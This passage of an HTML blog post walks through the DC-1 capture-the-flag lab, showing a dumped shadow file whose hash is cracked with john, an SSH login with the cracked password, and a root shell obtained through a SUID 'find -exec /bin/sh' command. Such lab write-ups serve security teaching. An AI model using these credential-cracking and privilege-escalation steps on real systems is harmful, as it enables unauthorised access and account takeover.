+games:*:17946:0:99999:7:::
+man:*:17946:0:99999:7:::
+lp:*:17946:0:99999:7:::
+mail:*:17946:0:99999:7:::
+news:*:17946:0:99999:7:::
+uucp:*:17946:0:99999:7:::
+proxy:*:17946:0:99999:7:::
+www-data:*:17946:0:99999:7:::
+backup:*:17946:0:99999:7:::
+list:*:17946:0:99999:7:::
+irc:*:17946:0:99999:7:::
+gnats:*:17946:0:99999:7:::
+nobody:*:17946:0:99999:7:::
+libuuid:!:17946:0:99999:7:::
+Debian-exim:!:17946:0:99999:7:::
+statd:*:17946:0:99999:7:::
+messagebus:*:17946:0:99999:7:::
+sshd:*:17946:0:99999:7:::
+mysql:!:17946:0:99999:7:::
+flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::
+</code></pre><p>I copied this information into a text file and ran <code>john</code> on it to crack the hashes. I have successfully cracked the <code>flag4</code> user password.</p>
+<pre><code>▲ ~/Downloads john shadow.txt --show
+flag4:orange:17946:0:99999:7:::
+
+1 password hash cracked, 1 left
+</code></pre><div class="addthis_tipjar_inline"></div>
+
+<h2 id="Access-via-SSH"><a href="#Access-via-SSH" class="headerlink" title="Access via SSH"></a>Access via SSH</h2><p>I managed to log in via SSH using these credentials and read the fourth flag in the home directory.</p>
+<pre><code>▲ ~/Downloads ssh flag4@192.168.1.45
+flag4@192.168.1.45&apos;s password:
+Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Mar  7 08:52:13 2019 from kali
+flag4@DC-1:~$ ls -la
+total 28
+drwxr-xr-x 2 flag4 flag4 4096 Mar  7 18:26 .
+drwxr-xr-x 3 root  root  4096 Feb 19 23:51 ..
+-rw------- 1 flag4 flag4  600 Mar  7 19:24 .bash_history
+-rw-r--r-- 1 flag4 flag4  220 Feb 19 23:25 .bash_logout
+-rw-r--r-- 1 flag4 flag4 3392 Feb 19 23:25 .bashrc
+-rw-r--r-- 1 flag4 flag4  125 Feb 19 23:28 flag4.txt
+-rw-r--r-- 1 flag4 flag4  675 Feb 19 23:25 .profile
+flag4@DC-1:~$ cat flag4.txt
+Can you use this same method to find or access the flag in root?
+
+Probably. But perhaps it&apos;s not that easy.  Or maybe it is?
+flag4@DC-1:~$
+</code></pre><blockquote>
+<p>Can you use this same method to find or access the flag in root? Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
+</blockquote>
+<h2 id="Popping-a-root-shell"><a href="#Popping-a-root-shell" class="headerlink" title="Popping a root shell"></a>Popping a root shell</h2><p>Since I found the find command with root SUID set I could easily read the final flag and consider this challenge done. I wanted to take these extra steps to fully compromise the system and not just go for root access immediately, but this time has come.</p>
+<pre><code>flag4@DC-1:~$ find . -exec &apos;/bin/sh&apos; \;
+# whoami
+root
+</code></pre><p>Finally, I went to the root directory to acquire the final flag, which was:</p>
+<pre><code># cd /root
+# ls
+thefinalflag.txt
+# cat thefinalflag.txt
+Well done!!!!
+
+Hopefully, you&apos;ve enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+</code></pre><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedbacks and donations are always welcome!</p>
+<p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Scanning"><span class="toc-number">1.1.</span> <span class="toc-text">Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-access"><span class="toc-number">1.2.</span> <span class="toc-text">Getting access</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Accessing-the-database"><span class="toc-number">2.</span> <span class="toc-text">Accessing the database</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Dumping-database-hashes"><span class="toc-number">2.1.</span> <span class="toc-text">Dumping database hashes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Find-with-SUID"><span class="toc-number">2.2.</span> <span class="toc-text">Find with SUID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cracking-another-hash"><span class="toc-number">2.3.</span> <span class="toc-text">Cracking another hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Access-via-SSH"><span class="toc-number">2.4.</span> <span class="toc-text">Access via SSH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Popping-a-root-shell"><span class="toc-number">2.5.</span> <span class="toc-text">Popping a root shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-you-go"><span class="toc-number">2.6.</span> <span class="toc-text">Before you go</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/&text=DC-1 Walkthrough"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/&title=DC-1 Walkthrough"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DC-1 Walkthrough&body=Check out this article: https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/&title=DC-1 Walkthrough"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <!--<a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>-->
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Kristof Toth
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-131012780-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'infosecadventures';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
